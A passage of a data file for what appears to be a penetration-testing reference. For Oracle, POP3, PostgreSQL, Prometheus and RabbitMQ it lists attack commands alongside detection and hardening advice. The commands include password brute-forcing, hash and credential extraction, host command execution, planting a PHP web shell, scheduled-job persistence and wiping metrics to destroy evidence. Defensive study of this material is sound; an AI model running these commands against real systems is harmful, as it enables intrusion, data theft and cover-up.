          "sqlplus <user>/<password>@<target>:1521/<service_name> -e \"SELECT username, password FROM dba_users WHERE account_status='OPEN';\" > oracle_hashes.txt",
        detail:
          "The dictionary stores password verifiers rather than plaintext, and older versions of the algorithm are weak enough to crack quickly offline. Recovered credentials frequently match the same accounts on other systems.",
        detection:
          "Direct reads of dba_users from sessions that are not administrative tooling indicate credential harvesting.",
        fix: "Move to the latest verifier algorithm, apply a password verification function, keep the dictionary readable only by the DBA role and rotate any credential ever stored under the old scheme.",
      },
    ],
    postEx: [
      {
        title: "Read the server filesystem with UTL_FILE",
        severity: "high",
        command:
          "sqlplus <user>/<password>@<target>:1521/<service_name> -e \"SELECT utl_file.fopen('/etc/passwd','R');\"",
        detail:
          "UTL_FILE reaches outside the database into the operating system filesystem, subject to the directory list in utl_file directory parameters and to the privileges granted on the package.",
        detection:
          "Calls to UTL_FILE from sessions that do not run export jobs are a strong indicator of an attempt to read host files.",
        fix: "Revoke EXECUTE on UTL_FILE from application accounts, keep the directory list empty, and run the listener and instance on a host where the sensitive files are not readable.",
      },
      {
        title: "Persistence through a scheduled job",
        severity: "high",
        command:
          "sqlplus <user>/<password>@<target>:1521/<service_name> -e \"BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'nightly', job_action=>'BEGIN EXECUTE IMMEDIATE ''cmd''; END;', start_date=>SYSDATE, repeat_interval=>'FREQ=DAILY; INTERVAL=1 DAY', enabled=>TRUE); END; /\"",
        detail:
          "DBMS_SCHEDULER stores work inside the database, so it survives a restart of the application and of the host. A job that runs on a schedule is harder to notice than a one-off command.",
        detection:
          "New scheduler jobs, and any job whose job_action is a PL/SQL block rather than a stored executable, deserve a review.",
        fix: "Revoke CREATE JOB from application roles, review the scheduler queue regularly, and alert on new job definitions.",
      },
      {
        title: "Pivot over an outbound database link",
        severity: "medium",
        command:
          "sqlplus <user>/<password>@<target>:1521/<service_name> -e 'SELECT db_link, user FROM v$session;'",
        detail:
          "A database link lets the Oracle instance reach another server as a set remote user. It is the easiest way out of a segmented database tier, and it often carries stronger privileges than the session that used it.",
        detection:
          "Unusual outbound connections from the database host and newly created DB_LINK entries in dba_db_links.",
        fix: "Restrict DB_LINK creation to administrators, require a strong password or a wallet for the remote account, and firewall outbound database traffic.",
      },
    ],
    commands: [
      { command: "SELECT banner FROM v$version;", description: "Exact product version and patch level." },
      { command: "SELECT name FROM v$database;", description: "Confirms which instance you are connected to." },
      { command: "SELECT username, account_status FROM dba_users;", description: "Lists accounts and flags locked or expired ones." },
      { command: "SELECT granted_role FROM dba_role_privs WHERE grantee='SCOTT';", description: "Shows the roles held by a given account." },
      { command: "SELECT * FROM dba_profiles WHERE profile='DEFAULT';", description: "Shows password policy and resource limits." },
      { command: "SELECT db_link, user FROM v$session;", description: "Lists outbound database links and their remote users." },
      { command: "SELECT owner, name, type FROM dba_source;", description: "Lists PL/SQL source that any user can read." },
      { command: "BEGIN DBMS_SCHEDULER.CREATE_JOB(...); END;", description: "Creates a job that runs inside the database." },
      { command: "ALTER USER scott IDENTIFIED BY '<new-password>';", description: "Rotates the password on an account." },
      { command: "lsnrctl services", description: "Prints the listener's service registry." },
    ],
    hardening: [
      {
        title: "Remove the sample schemas",
        detail:
          "Drop SCOTT, HR, OE and any other installation sample accounts as soon as the database is created.",
      },
      {
        title: "Apply a strong password verification function",
        detail:
          "A profile with an ORACLE12C_VERIFY_FUNCTION style policy forces complexity, expiry and a check against reused passwords.",
      },
      {
        title: "Restrict who can create code",
        detail:
          "CREATE PROCEDURE, CREATE LIBRARY and CREATE JOB are the privileges that turn SQL into shell access. Application roles should not hold them.",
      },
      {
        title: "Protect the listener",
        detail:
          "Keep the listener bound to an internal interface, register services in the local listener configuration and enable the listener log so access attempts are recorded.",
      },
      {
        title: "Enable TLS on the listener",
        detail:
          "Configure SECURE_REGISTER and an SSL listener so credentials and data are not sent in the clear inside the network.",
      },
      {
        title: "Patch on the Oracle CPU schedule",
        detail:
          "Listener and database bugs are fixed on a quarterly cadence. Running an unpatched listener on a routable network is a known way to lose a server.",
      },
    ],
    tools: ["nmap", "hydra", "metasploit", "netcat", "sqlplus"],
  },

  {
    slug: "pop3",
    name: "POP3",
    port: 110,
    protocol: "tcp",
    risk: "medium",
    tags: ["mail", "legacy", "cleartext"],
    summary:
      "POP3 is the protocol that downloads mail and, with a delete flag, removes it from the server. It is a plain text protocol with no encryption in its base form, so the username and password travel the network in the clear on every session. The service is still widely deployed on embedded devices and older appliances that never received an update, and those devices rarely enforce anything about the passwords they accept.",
    connect: [
      {
        label: "Raw session",
        command: "nc -nv <target> 110",
        detail: "The server greets with +OK and then reads USER, PASS and every other command as plain lines.",
      },
      {
        label: "Secure port",
        command: "openssl s_client -connect <target>:995 -quiet",
        detail: "Port 995 is POP3 wrapped in TLS from the start, so the credentials are never exposed on the wire.",
      },
      {
        label: "Mail client fetch",
        command: "curl -s --url pop3://<target>/ --user '<user>:<password>'",
        detail: "curl implements the POP3 client side and is useful for a scripted check of a single mailbox.",
      },
    ],
    recon: [
      {
        title: "Service and capability probe",
        command: "nmap -sV -p 110,995 --script pop3-capabilities <target>",
        detail:
          "The script authenticates if it can and asks the server for its supported extensions, which reveals whether STLS, USER, SASL and UTF8 are on offer.",
      },
      {
        title: "Plain text greeting",
        command: "nc -nv <target> 110 < /dev/null",
        detail:
          "The greeting banner is returned before any command is sent, so a single connect is enough to confirm the protocol.",
      },
    ],
    enumeration: [
      {
        title: "Capability negotiation",
        command: "printf 'CAPA\\r\\nQUIT\\r\\n' | nc -nv <target> 110",
        detail:
          "CAPA lists the extensions the server supports. A server that advertises nothing but USER and PASS is a server that has never been configured.",
      },
      {
        title: "Mailbox listing once authenticated",
        command: "printf 'USER <user>\\r\\nPASS <password>\\r\\nSTAT\\r\\nLIST\\r\\nQUIT\\r\\n' | nc -nv <target> 110",
        detail:
          "STAT returns the message count and total size, and LIST gives a per-message index. Mailbox size is a good indicator of whose account it is.",
      },
      {
        title: "Secure banner",
        command: "openssl s_client -connect <target>:995 -quiet < /dev/null",
        detail:
          "The TLS handshake exposes the certificate and its subject, which often names the mail provider or the appliance that issued it.",
      },
    ],
    attacks: [
      {
        title: "Credential capture from cleartext traffic",
        severity: "high",
        command: "tshark -i eth0 -Y 'pop' -T fields -e ip.src -e ip.dst -e pop.user -e pop.pass",
        detail:
          "POP3 sends USER and PASS as plain strings. Anyone on the path reads a working mailbox password, and mailbox passwords are usually reused on internal services.",
        detection:
          "Any POP3 session from a host that is not the user's device should be flagged, and a sudden change of source address for one account is worth a look.",
        fix: "Move clients to IMAPS on 993, deprecate plain POP3, and require a TLS upgrade before any authentication is accepted.",
      },
      {
        title: "Weak mailbox credentials",
        severity: "medium",
        command: "hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s 110 pop3://<target>",
        detail:
          "The protocol has no lockout and no rate limit by default, so an offline wordlist is tried at full speed against every account that exists on the server.",
        detection:
          "Repeated authentication failures against one account from a single source is the obvious signal.",
        fix: "Apply lockout or throttling in front of the service, require strong unique mailbox passwords and enable multi-factor authentication on the mail system itself.",
      },
      {
        title: "Credential reuse against other services",
        severity: "high",
        command: "hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s 443 https://<sso-domain>",
        detail:
          "A recovered mailbox password is a serious find on its own because mailboxes hold password reset flows for everything else. The same string is often valid on the corporate single sign-on and on internal tools.",
        detection:
          "The same account authenticating successfully on services it has never used is the pattern to look for.",
        fix: "Enable multi-factor authentication on every service that accepts a password, and make sure the mail system itself cannot be used to reset without a second factor.",
      },
    ],
    postEx: [
      {
        title: "Download and search the mailbox",
        severity: "medium",
        command: "curl -s --url pop3://<target>/ --user '<user>:<password>' -o mailbox.eml",
        detail:
          "Mailboxes accumulate everything: internal reports, password reset links, invoices and the names of colleagues. A single account is often a map of the organisation.",
        detection:
          "Unusual mailbox volume for an account, or a download from an address outside the user's normal geography.",
        fix: "Require IMAPS with a modern client, restrict mailbox access by network policy, and keep audit logging on every mail access.",
      },
      {
        title: "Trigger password resets from the recovered mailbox",
        severity: "high",
        command: "curl -s -X POST https://<domain>/account/reset -d 'email=<user>@<domain>'",
        detail:
          "Any account on the mail system can usually start a reset for the resources it owns. If the reset flow only checks the mailbox, then holding the mailbox is enough to take over the target account.",
        detection:
          "Reset requests from a session whose user agent or source does not match the mailbox owner.",
        fix: "Send reset notifications to a second channel, require a second factor, and expire reset links quickly.",
      },
      {
        title: "Recover stored credentials on the device",
        severity: "medium",
        command: "find /home -maxdepth 5 \\( -name '*.thunderbird' -o -name '*.ost' -o -name 'profiles.ini' \\) 2>/dev/null",
        detail:
          "Local mail clients cache the mail and often the account settings, and older versions stored the password in a reversible form in the preferences file.",
        detection:
          "Process access to mail client directories from a non-mail process is the signal to alert on.",
        fix: "Require full disk encryption, ensure the mail client stores credentials in the operating system keychain, and wipe the profile on departure.",
      },
    ],
    commands: [
      { command: "USER <user>", description: "Starts authentication with the mailbox name." },
      { command: "PASS <password>", description: "Supplies the mailbox password in clear text." },
      { command: "CAPA", description: "Lists the extensions the server supports." },
      { command: "STAT", description: "Returns the number of messages and their total size." },
      { command: "LIST", description: "Lists each message with its index and size." },
      { command: "UIDL", description: "Lists unique message identifiers." },
      { command: "RETR 1", description: "Downloads the first message." },
      { command: "TOP 1 0", description: "Shows headers and the first line of a message." },
      { command: "DELE 1", description: "Marks a message for deletion at the end of the session." },
      { command: "QUIT", description: "Ends the session and applies pending deletions." },
    ],
    hardening: [
      {
        title: "Move to IMAPS",
        detail:
          "IMAP keeps mail on the server, works from every device and lets you enforce server-side policy. POP3 has no place on a managed endpoint.",
      },
      {
        title: "Require TLS before authentication",
        detail:
          "Refuse USER and PASS unless the session is already encrypted, and redirect port 110 to 995 rather than allowing a plaintext login.",
      },
      {
        title: "Enforce multi-factor authentication",
        detail:
          "Mailbox access is a credential reset path for most of the organisation, so it deserves the same factor as the rest of the estate.",
      },
      {
        title: "Rate limit and lock out",
        detail:
          "Put a rate limit or an authentication proxy in front of the service so an offline wordlist cannot run at full speed.",
      },
      {
        title: "Monitor access from unexpected sources",
        detail:
          "Log every successful and failed session with its source address and alert when one account appears from a new network.",
      },
      {
        title: "Retire the service on appliances",
        detail:
          "Embedded devices that ship with POP3 open should be upgraded, replaced or placed behind a management segment with no route to the internet.",
      },
    ],
    tools: ["nmap", "hydra", "netcat", "tshark", "metasploit"],
  },

  {
    slug: "postgresql",
    name: "PostgreSQL",
    port: 5432,
    protocol: "tcp",
    risk: "high",
    tags: ["database", "sql", "rdbms"],
    summary:
      "PostgreSQL speaks a versioned startup protocol that the server answers before authentication, so a port check gives you the major version straight away. Its authorisation rules live in pg_hba.conf, and a trust entry or a peer rule applied to the wrong address makes authentication a formality rather than a barrier. Because a superuser can read and write files on the host, the difference between a normal role and a superuser role is the difference between a database and a server.",
    connect: [
      {
        label: "psql client",
        command: "psql -h <target> -p 5432 -U <user> -d postgres",
        detail: "psql asks for the password interactively, which keeps it out of your shell history.",
      },
      {
        label: "Connection URI",
        command: "psql \"postgresql://<user>:<password>@<target>:5432/<database>\"",
        detail: "The URI form is what you will see in an application's environment file or its connection pool settings.",
      },
      {
        label: "Single query",
        command: "psql -h <target> -U <user> -d postgres -c 'SELECT version();'",
        detail: "The -c flag runs one statement and exits, which is handy for scripted checks.",
      },
    ],
    recon: [
      {
        title: "Version and brute-force check",
        command: "nmap -sV -p 5432 --script pgsql-brute <target>",
        detail:
          "PostgreSQL does not send a banner until the client speaks, so a script that completes the startup exchange is what identifies the service. pgsql-brute tries a handful of common credentials and reports any that work.",
      },
      {
        title: "Startup packet probe",
        command: "printf '\\x00\\x00\\x00\\x08\\x04\\xd2\\x16\\x2f' | nc -nv <target> 5432",
        detail:
          "An SSLRequest packet is enough to make the server identify itself in the error message it returns.",
      },
    ],
    enumeration: [
      {
        title: "Database list",
        command: "psql -h <target> -U <user> -d postgres -c '\\l'",
        detail:
          "The list of databases shows the naming convention of the estate and often names a reporting or staging instance worth a closer look.",
      },
      {
        title: "Roles and privileges",
        command: "psql -h <target> -U <user> -d postgres -c '\\du'",
        detail:
          "The role listing marks which accounts are superusers and which can create databases and roles. Those three flags are what you are looking for.",
      },
      {
        title: "Server configuration",
        command: "psql -h <target> -U <user> -d postgres -c \"SELECT name, setting FROM pg_settings WHERE name IN ('version','data_directory','config_file','listen_addresses','hba_file');\"",
        detail:
          "The configuration file locations and the listen address tell you where the rules live and whether the server is exposed beyond localhost.",
      },
    ],
    attacks: [
      {
        title: "Passwordless access through a trust rule",
        severity: "critical",
        command: "psql -h <target> -U postgres -d postgres -c 'SELECT current_user;'",
        detail:
          "A trust entry in pg_hba.conf removes the password requirement for a range of addresses. If that range covers your position, the superuser account is one command away.",
        detection:
          "Successful logins with no password challenge, and log entries for roles that never appear in an application configuration.",
        fix: "Replace trust with scram-sha-256 in pg_hba.conf, restrict every rule to a named subnet, and reload the configuration after each change.",
      },
      {
        title: "Weak or default database credentials",
        severity: "high",
        command: "hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://<target>",
        detail:
          "The postgres superuser account is created with no password on some installers, and the database has no built-in rate limiting, so a wordlist is tried without slowing down.",
        detection:
          "Repeated authentication failures against the same role from one source address.",
        fix: "Set a strong password for the superuser, require scram-sha-256 for every host rule, and give each application its own non-privileged role.",
      },
      {
        title: "Filesystem access through a superuser session",
        severity: "critical",
        command:
          "psql -h <target> -U postgres -d postgres -c \"SELECT pg_read_file('/etc/passwd');\"",
        detail:
          "A superuser can read files on the server and, with COPY FROM PROGRAM, run commands as the postgres service account. The account you are logged into matters more than the password strength.",
        detection:
          "Calls to pg_read_file, pg_read_binary_file or COPY ... FROM PROGRAM are unusual in application traffic and worth alerting on.",
        fix: "Remove the superuser role from every application login, reserve it for administration over a local socket, and use the pg_read_server_files and pg_execute_server_program roles only where they are genuinely needed.",
      },
    ],
    postEx: [
      {
        title: "Execute commands as the service account",
        severity: "critical",
        command:
          "psql -h <target> -U postgres -d postgres -c \"COPY (SELECT '') TO PROGRAM 'id > /tmp/pg_pwn.txt';\"",
        detail:
          "COPY FROM PROGRAM hands the string to the shell as the postgres user. It is a clean command execution primitive and the resulting file is trivial to read back.",
        detection:
          "COPY ... TO PROGRAM appearing in the database log, and unexpected child processes spawned by the postgres service account.",
        fix: "Revoke the ability to run programs, keep the superuser role away from application traffic, and run the service under a restricted system account with no interactive shell.",
      },
      {
        title: "Write into the web root",
        severity: "high",
        command:
          "psql -h <target> -U postgres -d postgres -c 'COPY (SELECT $$<?php system($_GET[0]); ?>$$) TO $$/var/www/html/app/shell.php$$;'",
        detail:
          "The same COPY primitive writes files. Pointing it at a directory the web server serves turns a database foothold into a web shell.",
        detection:
          "New executable or script files appearing in web roots without a corresponding deployment record.",
        fix: "Keep the database on a separate host or segment, run the service as an unprivileged account that cannot write to the web tree, and treat database writes into application directories as an incident.",
      },
      {
        title: "Extract password hashes for offline cracking",
        severity: "high",
        command:
          "psql -h <target> -U postgres -d postgres -c \"SELECT rolname, rolpassword FROM pg_authid;\"",
        detail:
          "The hash table is readable by a superuser and the SCRAM and MD5 verifiers both fall to a wordlist. Recovered passwords are commonly reused on other services.",
        detection:
          "Reads of pg_authid and pg_shadow from a session that is not administrative tooling.",
        fix: "Keep pg_authid readable only by a dedicated role, enforce scram-sha-256, and rotate any credential that has been exposed as a hash.",
      },
    ],
    commands: [
      { command: "SELECT version();", description: "Exact version and platform of the server." },
      { command: "\\l", description: "Lists databases and their owners." },
      { command: "\\du", description: "Lists roles with their superuser and creation flags." },
      { command: "\\dt *.*", description: "Lists tables across every schema." },
      { command: "SELECT rolname, rolsuper, rolcreatedb FROM pg_roles;", description: "Shows which accounts hold elevated roles." },
      { command: "SHOW config_file;", description: "Path to the postgresql.conf file." },
      { command: "SHOW hba_file;", description: "Path to the pg_hba.conf authorisation file." },
      { command: "SELECT pg_read_file('/etc/passwd');", description: "Reads a host file when the role is allowed to." },
      { command: "COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';", description: "Runs a command as the service account." },
      { command: "ALTER USER app WITH PASSWORD '<new-password>';", description: "Rotates the password on a role." },
    ],
    hardening: [
      {
        title: "Replace trust with scram-sha-256",
        detail:
          "Every host rule in pg_hba.conf should name an authentication method. Trust has no place outside a developer's own machine.",
      },
      {
        title: "Restrict the rules to named sources",
        detail:
          "Scope each pg_hba.conf line to a specific address or subnet and give the reject rule a deliberate order, because the first match wins.",
      },
      {
        title: "Keep the superuser role for administration only",
        detail:
          "Applications should never connect as postgres. Create a dedicated role per service and grant only the privileges the schema actually needs.",
      },
      {
        title: "Require TLS with certificate verification",
        detail:
          "Set sslmode to verify-full for client connections so that credentials and data are encrypted and the server is authenticated.",
      },
      {
        title: "Listen on a private interface",
        detail:
          "Set listen_addresses to the internal address only and let the firewall handle the boundary as a second layer.",
      },
      {
        title: "Log connection attempts and elevated activity",
        detail:
          "Turn on connection logging and review the log for failed logins, role creation and any use of the file and program functions.",
      },
    ],
    tools: ["nmap", "hydra", "metasploit", "netcat", "psql", "sqlmap"],
  },

  {
    slug: "prometheus",
    name: "Prometheus",
    port: 9090,
    protocol: "tcp",
    risk: "high",
    tags: ["monitoring", "metrics", "http"],
    summary:
      "Prometheus is a pull-based metrics database and it ships with no authentication whatsoever. The default configuration exposes the raw metric endpoint, the list of scrape targets and the alert and rule APIs to anyone who can reach the port. That is more than a disclosure problem, because the metrics often carry internal hostnames, cloud identifiers and occasionally credentials embedded in labels, and the administrative API can delete data if it has been enabled.",
    connect: [
      {
        label: "Health endpoint",
        command: "curl -s http://<target>:9090/-/healthy",
        detail: "Returns a single word. It is the quickest way to confirm the server is up before doing anything else.",
      },
      {
        label: "Scrape targets",
        command: "curl -s http://<target>:9090/api/v1/targets | jq '.data.activeTargets[].scrapeUrl'",
        detail: "The target list is a map of everything the server monitors, including hosts that are not exposed anywhere else.",
      },
      {
        label: "Metric dump",
        command: "curl -s http://<target>:9090/metrics | head -50",
        detail: "Every scraped metric is served in the Prometheus text format on a plain HTTP endpoint.",
      },
    ],
    recon: [
      {
        title: "Service fingerprinting",
        command: "nmap -sV -p 9090 --script http-title,http-methods <target>",
        detail:
          "The title and the allowed methods identify Prometheus quickly. An Allow header listing GET and POST means the write APIs are reachable.",
      },
      {
        title: "HTTP headers",
        command: "curl -s -I http://<target>:9090/",
        detail:
          "Prometheus answers the root path with the landing page listing the built-in endpoints, which is a convenient map of the API surface.",
      },
    ],
    enumeration: [
      {
        title: "Target inventory",
        command: "curl -s http://<target>:9090/api/v1/targets | jq '.data.activeTargets[] | {job: .labels.job, url: .scrapeUrl, health: .health}'",
        detail:
          "Every scrape URL is recorded along with its health. A target that is down but still configured tells you the monitoring covers a system that no longer exists.",
      },
      {
        title: "Server configuration",
        command: "curl -s http://<target>:9090/api/v1/status/config | jq",
        detail:
          "The configuration API returns the scrape configuration, the rule files and the external labels. It frequently contains the addresses of internal management systems.",
      },
      {
        title: "Metric labels as a data source",
        command: "curl -s http://<target>:9090/metrics | grep -iE 'password|secret|token|apikey|authorization'",
        detail:
          "Labels are untyped strings that exporters add freely. Searching the metric output for credential-shaped words regularly turns up a connection string with a password in it.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated access to metrics and targets",
        severity: "high",
        command: "curl -s http://<target>:9090/metrics",
        detail:
          "Without authentication the entire metric store is readable. It describes the estate in detail: service names, hostnames, ports, software versions, user identifiers and occasionally secrets passed as labels.",
        detection:
          "Access to port 9090 from outside the monitoring network, and a burst of requests to /metrics or /api/v1/targets from a source that is not the monitoring host.",
        fix: "Put the server behind an authenticating reverse proxy, restrict the port to the monitoring network and enable TLS.",
      },
      {
        title: "Administrative API abuse to destroy data",
        severity: "critical",
        command: "curl -X POST 'http://<target>:9090/api/v1/admin/tsdb/delete_series' --data-urlencode 'match[]={job=\"node\"}'",
        detail:
          "When the server is started with the administrative API enabled, the delete endpoint accepts a series selector and removes matching time series from storage. A single request can erase the evidence an investigation depends on.",
        detection:
          "Any request to /api/v1/admin is a red flag, and gaps in the metric store between two otherwise continuous series are worth investigating.",
        fix: "Leave --web.enable-admin-api off in production, restrict the flag to a separate instance used for maintenance, and alert on requests to the /api/v1/admin path.",
      },
      {
        title: "Rule injection to break alerting",
        severity: "medium",
        command: "curl -X POST http://<target>:9090/api/v1/rules -H 'Content-Type: application/json' -d '{\"name\":\"silence-all\",\"groups\":[{\"name\":\"g\",\"rules\":[{\"record\":\"up\",\"expr\":\"vector(0)\"}]}]}'",
        detail:
          "Rules can be created through the API. Adding a rule that always evaluates to zero for a critical expression makes a genuine alert disappear into a flood of noise.",
        detection:
          "Rule files changing outside the configuration management pipeline, and a mismatch between the rule set in the repository and the one the server reports.",
        fix: "Disable the write APIs, manage rules entirely from version control, and treat any change to the rule set as a deployment event.",
      },
    ],
    postEx: [
      {
        title: "Recover credentials from metric labels",
        severity: "high",
        command: "curl -s http://<target>:9090/metrics | grep -iE '(password|secret|token|key|dsn|url)=' | sort -u | head -40",
        detail:
          "Exporters for databases, message queues and cloud clients frequently publish a DSN or an access key as a label. These are complete credentials for the service in question.",
        detection:
          "A sudden increase in the cardinality of a metric, or a label value that contains a URL with a password in it.",
        fix: "Strip credentials from labels at the exporter, replace them with an identifier that points at a secret store, and rotate anything that has been published.",
      },
      {
        title: "Pivot to internal systems through the target list",
        severity: "medium",
        command: "curl -s http://<target>:9090/api/v1/targets | jq -r '.data.activeTargets[].scrapeUrl' | sort -u",
        detail:
          "The monitor is already connected to hosts that are otherwise unreachable from your position. The list tells you where to aim next, including management interfaces on the same hosts.",
        detection:
          "Scans against hosts that only the monitoring network can reach indicate that the target list has been used.",
        fix: "Keep the monitoring network separate, restrict the API to the monitoring hosts, and avoid exposing target metadata to non-administrative readers.",
      },
      {
        title: "Erase history to defeat the investigation",
        severity: "critical",
        command: "curl -X POST 'http://<target>:9090/api/v1/admin/tsdb/delete_series' --data-urlencode 'match[]={__name__=~\".+\"}' --data-urlencode 'start=0s'",
        detail:
          "A match on every metric name and an unbounded start time clears the store. The gap in the data is itself a signal, but the destroyed evidence slows the response considerably.",
        detection:
          "A sudden drop in stored series count, and any request carrying a match parameter on the admin path.",
        fix: "Do not enable the administrative API on the production instance, keep an off-site copy of the metrics store, and limit retention deletion to scheduled jobs.",
      },
    ],
    commands: [
      { command: "curl -s http://<target>:9090/-/healthy", description: "Liveness check for the server." },
      { command: "curl -s http://<target>:9090/metrics | head -50", description: "Raw metric output in the Prometheus text format." },
      { command: "curl -s http://<target>:9090/api/v1/targets | jq", description: "Lists every configured scrape target and its health." },
      { command: "curl -s http://<target>:9090/api/v1/status/config | jq", description: "Returns the scrape configuration and rule files." },
      { command: "curl -s http://<target>:9090/api/v1/rules | jq", description: "Lists the loaded recording and alerting rules." },
      { command: "curl -s http://<target>:9090/api/v1/alerts | jq", description: "Shows the alerts currently firing." },
      { command: "curl -s --data-urlencode 'query=up' http://<target>:9090/api/v1/query", description: "Runs an instant query against the store." },
      { command: "curl -s 'http://<target>:9090/federate?match[]={__name__=~\".+\"}'", description: "Federation endpoint that returns every series." },
      { command: "curl -s http://<target>:9090/api/v1/label/__name__/values", description: "Lists every metric name the server holds." },
      { command: "curl -s -X POST http://<target>:9090/api/v1/admin/tsdb/delete_series --data-urlencode 'match[]={job=\"node\"}'", description: "Deletes matching series when the admin API is enabled." },
    ],
    hardening: [
      {
        title: "Put an authenticating proxy in front",
        detail:
          "OAuth2 or OIDC with a reverse proxy gives you identity on every request and a single place to log access to the API.",
      },
      {
        title: "Leave the administrative API off",
        detail:
          "The --web.enable-admin-api flag should not be present on the production instance. Run maintenance tasks against a separate server if the endpoint is genuinely needed.",
      },
      {
        title: "Restrict the network path",
        detail:
          "Bind the server to a management interface and allow only the monitoring hosts and the on-call tooling to reach port 9090.",
      },
      {
        title: "Keep secrets out of labels",
        detail:
          "Label values are permanent and widely readable. Reference a secret store key in the label and resolve the value inside the exporter.",
      },
      {
        title: "Enable TLS",
        detail:
          "Serve the API over HTTPS so that queries and configuration are not visible to anything on the network path.",
      },
      {
        title: "Log API access",
        detail:
          "Record every request against the API and alert on the administrative paths and on an unusual request rate from a single source.",
      },
    ],
    tools: ["nmap", "curl", "httpx", "netcat", "metasploit", "gobuster"],
  },

  {
    slug: "rabbitmq",
    name: "RabbitMQ",
    port: 5672,
    protocol: "tcp",
    risk: "high",
    tags: ["messaging", "queue", "amqp"],
    summary:
      "RabbitMQ carries the messages that move work between the parts of an application, and AMQP offers a rich permission model that is often left unused. The default installation ships a guest account with a known password, and the management plugin exposes queues, exchanges and users over HTTP with no separate authentication layer of its own. Message bodies are frequently credentials and payment details, because a queue is a convenient place to put a password reset link.",
    connect: [
      {
        label: "AMQP client",
        command: "amqp-consume --url amqp://<user>:<password>@<target>:5672/%2F --queue <queue> --count 10",
        detail: "amqp-consume from the amqp-tools package prints the headers and body of each message it receives.",
      },
      {
        label: "TLS listener",
        command: "openssl s_client -connect <target>:5671 -quiet",
        detail: "Port 5671 is the same protocol wrapped in TLS, which is the only version worth allowing on an untrusted network.",
      },
      {
        label: "Management API",
        command: "curl -s -u <user>:<password> http://<target>:15672/api/overview | jq",
        detail: "The management plugin listens on 15672 and gives a complete picture of the broker once you are authenticated.",
      },
    ],
    recon: [
      {
        title: "AMQP handshake probe",
        command: "nmap -sV -p 5672,15672 --script amqp-info,http-title <target>",
        detail:
          "amqp-info performs the protocol negotiation and returns the version and the set of supported mechanisms, which immediately tells you whether the broker offers TLS or plain AMQP.",
      },
      {
        title: "Protocol greeting",
        command: "nc -nv <target> 5672 < /dev/null",
        detail:
          "The broker replies with the AMQP protocol header, so a plain connect confirms the service without credentials.",
      },
    ],
    enumeration: [
      {
        title: "Broker overview",
        command: "curl -s -u <user>:<password> http://<target>:15672/api/overview | jq '{node, cluster_name, listeners, exchanges: (.exchange_details | length)}'",
        detail:
          "The overview lists the listeners and the exchanges. The node name often carries the hostname and the environment, which is useful for mapping the estate.",
      },
      {
        title: "Queues and bindings",
        command: "curl -s -u <user>:<password> http://<target>:15672/api/queues | jq '.[] | {name, messages, consumers}'",
        detail:
          "Queue names describe what flows through them. A queue with no consumer and a growing message count is either abandoned or a backlog worth understanding.",
      },
      {
        title: "Users and permissions",
        command: "curl -s -u <user>:<password> http://<target>:15672/api/users | jq '.[] | {name, tags}'",
        detail:
          "The tags field shows the administrator flag and the monitoring flag. An administrator account that is also used by an application is the configuration to look for.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated queue access",
        severity: "high",
        command: "amqp-consume --url amqp://guest:guest@<target>:5672/%2F --queue <queue> --count 5",
        detail:
          "When the guest account is enabled and the loopback restriction is not in place, which is common in containers, the default credentials work from anywhere. Queues with useful content are then readable and writable.",
        detection:
          "Logins to the broker from addresses outside the application network, and any guest login that does not originate from the broker host itself.",
        fix: "Delete the guest account or restrict it to loopback, give each application its own user, and never run the broker on a routable address without a firewall.",
      },
      {
        title: "Default or weak broker credentials",
        severity: "high",
        command: "hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s 5672 amqp://<target>",
        detail:
          "The broker does not throttle authentication, so a wordlist runs at full speed. Broker administrators often reuse a domain password for the account.",
        detection:
          "Repeated authentication failures for one user from a single source in the broker log.",
        fix: "Use strong unique credentials stored in a secret manager, enable the guest account restriction and monitor failed authentication attempts.",
      },
      {
        title: "Message content disclosure through the queue",
        severity: "medium",
        command: "amqp-consume --url amqp://<user>:<password>@<target>:5672/%2F --queue <queue> --count 50 | tee /tmp/messages.txt",
        detail:
          "Message bodies are the payload of the application. Password reset tokens, invoices and personal data all pass through queues, and a readable queue is a readable data store.",
        detection:
          "Consumers with a low rate compared to their peers, or a consumer that connects and then reads a queue it normally does not use.",
        fix: "Use per-queue permissions so a consumer can only read its own queue, enable TLS, and avoid putting secrets in message bodies.",
      },
    ],
    postEx: [
      {
        title: "Inject a message into a queue",
        severity: "high",
        command: "amqp-publish --url amqp://<user>:<password>@<target>:5672/%2F --exchange <exchange> --routing-key <key> --body '{\"order_id\":1}'",
        detail:
          "Write access to a queue means the attacker controls the input the consumer trusts. If the consumer turns the message into a command, an email or a payment, the queue becomes a remote control.",
        detection:
          "Messages appearing on a queue from a producer that is not the expected application, and an unexpected spike in consumer errors.",
        fix: "Apply configure, write and read permissions per queue, isolate producers from consumers, and validate every message the consumer accepts.",
      },
      {
        title: "Harvest credentials from message bodies",
        severity: "high",
        command: "amqp-consume --url amqp://<user>:<password>@<target>:5672/%2F --queue <queue> --count 200 | grep -iE 'password|token|secret|api[_-]?key'",
        detail:
          "A grep across a few hundred messages regularly returns a working credential, because systems queue password resets and connection details as a matter of course.",
        detection:
          "Unusual read patterns against queues that hold user data, and access from an account that normally only monitors.",
        fix: "Keep secrets out of message bodies, use short-lived tokens instead, and audit which accounts are allowed to read which queues.",
      },
      {
        title: "Enumerate permissions and vhosts",
        severity: "medium",
        command: "curl -s -u <user>:<password> http://<target>:15672/api/permissions | jq",
        detail:
          "The permission list shows which user holds which configure, write and read rights on which virtual host. Wide grants on a shared vhost are the usual finding.",
        detection:
          "Permission changes that are not linked to a deployment record.",
        fix: "Review permissions quarterly, create a vhost per application, and give the broker administrator role only to the people who need it.",
      },
    ],
    commands: [
      { command: "rabbitmqctl status", description: "Local broker status, node name and listeners." },
      { command: "rabbitmqctl list_users", description: "Lists users and their tags." },
      { command: "rabbitmqctl list_queues name messages consumers", description: "Lists queues with their depth and consumer count." },
      { command: "rabbitmqctl list_permissions", description: "Shows the permission grants per vhost." },
      { command: "amqp-publish --url amqp://<target>:5672/%2F -r <key> -b 'message'", description: "Publishes a message to a routing key." },
      { command: "amqp-consume --url amqp://<target>:5672/%2F -q <queue> --count 10", description: "Consumes messages from a queue." },
